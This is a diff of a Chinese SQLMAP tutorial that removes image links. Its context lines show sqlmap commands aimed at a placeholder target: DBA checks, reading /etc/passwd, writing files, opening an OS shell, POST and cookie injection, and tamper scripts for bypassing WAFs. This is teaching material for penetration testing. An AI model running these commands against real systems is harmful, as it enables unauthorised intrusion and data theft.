@@ -18,7 +18,6 @@
 
 SQLMAP是一款开源的自动化SQL注入工具，专门用于检测和利用SQL注入漏洞。它支持多种数据库（如MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Access等）和多种注入类型（如联合查询、布尔盲注、时间盲注、报错注入、堆叠查询）。
 
-![](img/2b96891e8636c95c08fae08a91f877bb_13.png)
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_15.png)
 
@@ -28,7 +27,6 @@ SQLMAP是一款开源的自动化SQL注入工具，专门用于检测和利用SQ
 
 ## 基础使用：从简单注入开始 🚀
 
-![](img/2b96891e8636c95c08fae08a91f877bb_19.png)
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_21.png)
 
@@ -50,9 +48,7 @@ SQLMAP是一款开源的自动化SQL注入工具，专门用于检测和利用SQ
 
 ### 环境准备与基本命令
 
-![](img/2b96891e8636c95c08fae08a91f877bb_37.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_39.png)
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_41.png)
 
@@ -106,13 +102,9 @@ Access数据库没有系统表（如`information_schema`），因此需要通过
 3.  使用 `--columns -T 表名` 参数猜解指定表的列名。
 4.  使用 `--dump -T 表名 -C 列名1,列名2` 参数导出指定列的数据。
 
-![](img/2b96891e8636c95c08fae08a91f877bb_71.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_73.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_75.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_77.png)
 
 **MySQL数据库**：
 MySQL等数据库有系统表，可以查询库、表、列信息，流程略有不同。
@@ -138,7 +130,6 @@ MySQL等数据库有系统表，可以查询库、表、列信息，流程略有
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_90.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_92.png)
 
 在确认注入点后，判断当前数据库用户的权限至关重要，这决定了我们能否进行更深层次的利用。
 
@@ -150,17 +141,14 @@ MySQL等数据库有系统表，可以查询库、表、列信息，流程略有
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_98.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_100.png)
 
 使用 `--is-dba` 参数可以判断当前数据库用户是否为高权限用户（如DBA、root）。
 
-![](img/2b96891e8636c95c08fae08a91f877bb_102.png)
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_104.png)
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_106.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_108.png)
 
 ```bash
 python sqlmap.py -u "http://target.com/page.php?id=1" --is-dba
@@ -169,19 +157,14 @@ python sqlmap.py -u "http://target.com/page.php?id=1" --is-dba
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_110.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_112.png)
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_114.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_116.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_118.png)
 
 ### 高权限下的高级操作
 
-![](img/2b96891e8636c95c08fae08a91f877bb_120.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_122.png)
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_124.png)
 
@@ -189,7 +172,6 @@ python sqlmap.py -u "http://target.com/page.php?id=1" --is-dba
 
 以下是高权限用户可能执行的一些操作：
 
-![](img/2b96891e8636c95c08fae08a91f877bb_128.png)
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_130.png)
 
@@ -205,7 +187,6 @@ python sqlmap.py -u "http://target.com/page.php?id=1" --file-read "/etc/passwd"
 ```
 读取服务器上的文件内容。
 
-![](img/2b96891e8636c95c08fae08a91f877bb_132.png)
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_134.png)
 
@@ -217,7 +198,6 @@ python sqlmap.py -u "http://target.com/page.php?id=1" --file-write "/local/path/
 ```
 将本地文件写入到服务器指定路径（需有写权限）。
 
-![](img/2b96891e8636c95c08fae08a91f877bb_138.png)
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_140.png)
 
@@ -231,7 +211,6 @@ python sqlmap.py -u "http://target.com/page.php?id=1" --os-shell
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_144.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_146.png)
 
 > **注意**：文件读写和命令执行功能严重依赖于数据库配置和权限（例如MySQL的 `secure_file_priv` 设置），并非所有高权限注入点都能成功。
 
@@ -249,24 +228,19 @@ python sqlmap.py -u "http://target.com/page.php?id=1" --os-shell
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_156.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_158.png)
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_160.png)
 
 ### POST注入
 
-![](img/2b96891e8636c95c08fae08a91f877bb_162.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_164.png)
 
 当注入点在POST请求体中时，使用 `--data` 参数。
 ```bash
 python sqlmap.py -u "http://target.com/login.php" --data="username=admin&password=pass"
 ```
 
-![](img/2b96891e8636c95c08fae08a91f877bb_166.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_168.png)
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_170.png)
 
@@ -277,7 +251,6 @@ python sqlmap.py -u "http://target.com/login.php" --data="username=admin&passwor
 python sqlmap.py -u "http://target.com/index.php" --cookie="sessionid=abc123; user=test"
 ```
 
-![](img/2b96891e8636c95c08fae08a91f877bb_172.png)
 
 ### 使用原始HTTP数据包（推荐）
 
@@ -308,7 +281,6 @@ python sqlmap.py -u "http://target.com/index.php" --cookie="sessionid=abc123; us
 
 网站通常会部署WAF或编写过滤代码来防御SQL注入。SQLMAP的Tamper脚本可以对注入载荷进行混淆、编码，以绕过这些防护。
 
-![](img/2b96891e8636c95c08fae08a91f877bb_188.png)
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_190.png)
 
@@ -333,9 +305,7 @@ python sqlmap.py -u "http://target.com/page.php?id=1" --tamper=base64encode,spac
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_202.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_204.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_206.png)
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_208.png)
 
@@ -350,7 +320,6 @@ python sqlmap.py -u "http://target.com/page.php?id=1" --tamper=base64encode,spac
 ![](img/2b96891e8636c95c08fae08a91f877bb_214.png)
 
 
-![](img/2b96891e8636c95c08fae08a91f877bb_216.png)
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_218.png)
 
@@ -386,7 +355,6 @@ def tamper(payload, **kwargs):
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_228.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_230.png)
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_232.png)
 
@@ -402,23 +370,16 @@ def tamper(payload, **kwargs):
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_240.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_242.png)
 
 为了更有效地使用SQLMAP，以下是一些关键参数和调试方法。
 
-![](img/2b96891e8636c95c08fae08a91f877bb_244.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_246.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_248.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_250.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_252.png)
 
 ### 常用参数
 
-![](img/2b96891e8636c95c08fae08a91f877bb_254.png)
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_256.png)
 
@@ -434,16 +395,13 @@ def tamper(payload, **kwargs):
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_266.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_268.png)
 
 **设置延迟**：防止因请求过快被屏蔽。
 ```bash
 python sqlmap.py -u "http://target.com/page.php?id=1" --delay=2
 ```
 
-![](img/2b96891e8636c95c08fae08a91f877bb_270.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_272.png)
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_274.png)
 
@@ -471,7 +429,6 @@ python sqlmap.py -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_286.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_288.png)
 
 **测试等级与风险等级**：
 *   `--level` (1-5)：测试的深入程度，等级越高，测试的Payload和参数越多（例如会测试HTTP头）。
@@ -483,19 +440,14 @@ python sqlmap.py -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_290.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_292.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_294.png)
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_296.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_298.png)
 
 ### 调试与信息获取
 
-![](img/2b96891e8636c95c08fae08a91f877bb_300.png)
 
-![](img/2b96891e8636c95c08fae08a91f877bb_302.png)
 
 ![](img/2b96891e8636c95c08fae08a91f877bb_304.png)
 
